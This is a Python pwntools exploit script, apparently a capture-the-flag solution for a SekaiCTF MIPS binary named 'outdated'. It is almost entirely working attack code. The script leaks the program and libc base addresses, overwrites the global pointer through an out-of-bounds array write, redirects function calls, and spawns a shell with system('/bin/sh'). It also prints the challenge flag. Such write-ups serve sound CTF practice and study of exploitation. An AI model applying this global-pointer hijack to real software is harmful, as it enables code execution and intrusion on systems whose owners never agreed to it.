from pwn import *
# from subprocess import getoutput

context.arch = 'mips'
context.bits = 32
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# socat TCP-LISTEN:9999,fork EXEC:"qemu-mipsel -g 1234 ./outdated"
# gdb-multiarch ./outdated
    # target remote :1234
    # brva 0x980
    # brva 0x9bc
    # brva 0xba4
    # brva 0xbf0
    # brva 0xc04
    # continue
# python3 outdated.py
    # p = remote('localhost', 9999)

p = gdb.debug('./outdated', '''
    # call printf in puts_blue (print out string in first argument)
    brva 0x980
    # jump back to main from puts_blue
    brva 0x9bc
    # execute "array[index] = value" likely, where index and value are read in from user input
    brva 0xba4
    # call last printf in main (influenced if gp overwritten)
    brva 0xbf0
    # call exit in main (influenced if gp overwritten)
    brva 0xc04
    continue
''')

# p = remote("outdated.chals.sekai.team", 1337, ssl=True)

# cmd = p.recvline().decode().strip().removeprefix("proof of work: ")
# sol = getoutput(cmd)
# p.sendlineafter(b"solution: ", sol.encode())
# pause()

# followings are some notes about mips32 assembly:
# 1. a0, a1, a2, a3 are the first four arguments of a function
# 2. "sdc2  0," is equal to "jalrc  t9" (jump to address in $t9 register and save return address to ra register), which is similar to "call"
# 3. "ldc2  0," is equal to "jrc  ra" (jump to address in ra register), which is similar to "jmp"

# followings are some points that can be exploited in this challenge:
# 1. $gp, aka global pointer, is stored at and restored from $gp=$fp+0x10, whose normal value is elf_base_address+0x28000 originally
# 2. $gp of each function is independent, which is used to locate string arguments and GOT table entries
# 3. program takes in 0x5f bytes at most as game_name at elf_base_address+0x200c0
# 4. program takes in a 4-byte int as level (positive or negative) and a 2-byte short as reward (positive), and set $fp+level*2+0x28=reward
# 5. when level is -12, last two bytes of $gp can be overwritten to reward
# 6. once $gp is polluted in a specific way, any address in arbitrary write area game_name can be faked to be any string argument or any GOT table entry
# above-mentioned concept is attack strategy

e = ELF('./outdated')
glibc_e = ELF('./ld-musl-mipsr6el-sf.so.1')

# 1. get elf base address
p.recvuntil(b"Here's a little bit of helpful information: ")
elf_base_addr = int(p.recvline().strip(), 16)-e.sym.main
log.info(f"elf base address: {hex(elf_base_addr)}")

# 2. leak glibc base address and call main again
# ensure that value at game_name is puts@got-0x118c, value at game_name+0x24 is main function address, and value at game_name+0x4c is puts_blue function address
p.recvuntil(b"What would you like to name your game?\n")
p.sendline(p32(elf_base_addr+e.got.puts-0x118c)+b'A'*0x20+p32(elf_base_addr+e.sym.main)+b'A'*0x24+p32(elf_base_addr+e.sym.puts_blue)+b'A'*0xc)
# overwrite $gp with game_name+0x7fd0 through integer overflow
p.sendlineafter(b"Which level do you want to change?\n", str((0x10-0x28)//2).encode())
p.sendlineafter(b"What reward do you want to set for this level?\n", str((e.sym.game_name+0x7fd0)&0xffff).encode())
p.recvline()
# *($gp-0x7f84)=*(game_name+0x4c) is viewed as a function address, *($gp-0x7fd0)+0x118c=*(game_name)+0x118c is viewed as its first argument
# original printf("Thanks for playing! Come again!") changes to puts_blue(puts@got)
glibc_base_addr = u32(p.recvline().strip()[5:9])-glibc_e.sym.puts
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# *($gp-0x7fac)=*(game_name+0x24) is viewed as a function address, 0 is viewed as its first argument
# original exit(0) changes to main(0)

# 3. trigger system("/bin/sh\x00")
# ensure that value at game_name is game_name+4-0x118c, value at game_name+4 is string "/bin/sh\x00", and value at game_name+0x4c is glibc system address
p.recvuntil(b"What would you like to name your game?\n")
p.sendline(p32(elf_base_addr+e.sym.game_name+4-0x118c)+b'/bin/sh\x00'+b'A'*0x40+p32(glibc_base_addr+glibc_e.sym.system)+b'A'*0xc)
# overwrite $gp with game_name+0x7fd0 through integer overflow
p.sendlineafter(b"Which level do you want to change?\n", str((0x10-0x28)//2).encode())
p.sendlineafter(b"What reward do you want to set for this level?\n", str((e.sym.game_name+0x7fd0)&0xffff).encode())
p.recvline()
# *($gp-0x7f84)=*(game_name+0x4c) is viewed as a function address, *($gp-0x7fd0)+0x118c=*(game_name)+0x118c is viewed as its first argument
# original printf("Thanks for playing! Come again!") changes to system("/bin/sh\x00")

p.interactive()

# SEKAI{I've_dubb3d_th1s_t3chn1que_"GP_Overwrite"}